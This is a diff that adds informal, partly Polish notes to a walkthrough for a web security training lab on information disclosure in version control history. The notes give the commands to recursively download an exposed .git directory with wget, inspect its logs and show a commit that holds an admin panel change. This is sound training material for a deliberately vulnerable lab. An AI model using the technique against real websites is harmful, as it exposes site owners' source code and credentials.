@@ -69,6 +69,22 @@ Walkthrough:
 <br><br>
 <h2>Lab: Information disclosure in version control history</h2>
 
+
+SOLUTION EASY:
+terminal:
+wget -r https://0a0600d603e898bf80d7cbc3000c00ea.web-security-academy.net/.git
+cd [GITHUB DIRECTORY]
+
+browser:
+https://0a0600d603e898bf80d7cbc3000c00ea.web-security-academy.net/.git/logs/
+
+terminal: wybieram w przegladarce lod z add skelton: 
+0000000000000000000000000000000000000000 0523f10640f26ceb64e0db565c18667ff9a98ad1 Carlos Montoya <carlos@carlos-montoya.net> 1781971013 +0000	commit (initial): Add skeleton admin panel
+git show 0523f10640f26ceb64e0db565c18667ff9a98ad1
+
+
+
+SOLUTION DZIWNE:
 Ppm discover content
 └─$ wget -r https://0a1600e3042864418022260d00d300f9.web-security-academy.net/.git 
 Cd githubowyfolder
